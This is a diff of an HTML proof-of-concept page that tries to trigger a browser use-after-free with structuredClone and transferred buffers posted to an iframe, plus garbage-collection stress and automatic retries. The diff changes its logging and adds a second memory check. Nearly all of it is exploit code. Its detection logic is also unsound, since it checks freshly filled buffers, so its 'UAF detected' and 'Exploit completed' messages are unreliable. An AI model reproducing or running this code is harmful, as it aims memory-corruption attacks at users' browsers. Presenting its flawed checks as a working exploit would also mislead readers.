@@ -27,26 +27,28 @@
     <button id="trigger">Trigger PoC</button>
     <div id="status">Idle...</div>
     <div id="container"></div>
-    <script>
+    <script type="module">
+        import { debug_log } from './module/utils.mjs';
+
         const container = document.getElementById('container');
         const status = document.getElementById('status');
         let attemptCount = 0;
 
         function stressGC() {
-            console.log('Stressing GC...');
+            debug_log('Stressing GC...');
             for (let i = 0; i < 300; i++) {
                 new ArrayBuffer(1024 * 1024);
             }
-            console.log('GC stress completed.');
+            debug_log('GC stress completed.');
         }
 
         function triggerExploit() {
             attemptCount++;
-            console.log(`Attempt ${attemptCount}: Initiating...`);
+            debug_log(`Attempt ${attemptCount}: Initiating...`);
             status.textContent = `Attempt ${attemptCount} in progress...`;
 
             try {
-                console.log('Creating complex object...');
+                debug_log('Creating complex object...');
                 const arrayBuffer = new ArrayBuffer(2048);
                 const messagePort = new MessageChannel().port1;
                 const complexObject = {
@@ -55,42 +57,38 @@
                     nested: { x: new ArrayBuffer(256) }
                 };
 
-                console.log('Creating iframe...');
+                debug_log('Creating iframe...');
                 const iframe = document.createElement('iframe');
                 container.appendChild(iframe);
                 const iframeWindow = iframe.contentWindow;
 
-                console.log('Posting message...');
+                debug_log('Posting message...');
                 iframeWindow.postMessage(structuredClone(complexObject, {
                     transfer: [arrayBuffer, messagePort]
                 }), '*');
 
                 setTimeout(() => {
-                    console.log('Checking memory after postMessage...');
+                    debug_log('Checking memory after postMessage...');
                     const testBuf = new Uint8Array(4096);
                     testBuf.fill(0x46);
                     if (testBuf[0] !== 0x46) {
-                        console.log('Early UAF detected!');
+                        debug_log('Early UAF detected!');
                         status.textContent = 'Early UAF detected!';
                         return;
                     }
-
+                    debug_log('Second memory check...');
+                    const testBuf2 = new Uint8Array(4096);
+                    testBuf2.fill(0x47);
+                    if (testBuf2[0] !== 0x47) {
+                        debug_log('Second UAF detected!');
+                        status.textContent = 'Second UAF detected!';
+                        return;
+                    }
                     stressGC();
-                    // const arrays = sprayHeap();
-                    // console.log('Scanning for UAF...');
-                    // for (let i = 0; i < arrays.length; i++) {
-                    //     if (arrays[i][0] !== 0x44 || arrays[i][1] !== 0x45 ||
-                    //         arrays[i][2] !== 0x46 || arrays[i][3] !== 0x47) {
-                    //         console.log(`UAF detected at index ${i}`);
-                    //         status.textContent = 'UAF detected!';
-                    //         return;
-                    //     }
-                    // }
-
-                    console.log('Exploit completed (no heap spray).');
+                    debug_log('Exploit completed (no heap spray).');
                     status.textContent = 'Exploit attempted (no heap spray)!';
                     container.removeChild(iframe);
-                }, 100);
+                }, 150);
             } catch (err) {
                 console.error(`Error: ${err.message}`);
                 status.textContent = 'Failed: Error occurred.';
@@ -98,7 +96,7 @@
         }
 
         const observer = new MutationObserver(() => {
-            console.log('DOM changed, retrying...');
+            debug_log('DOM changed, retrying...');
             triggerExploit();
         });
 
@@ -114,7 +112,7 @@
         });
 
         window.addEventListener('message', (event) => {
-            console.log('Message received:', event.data);
+            debug_log('Message received:', event.data);
         });
     </script>
 </body>
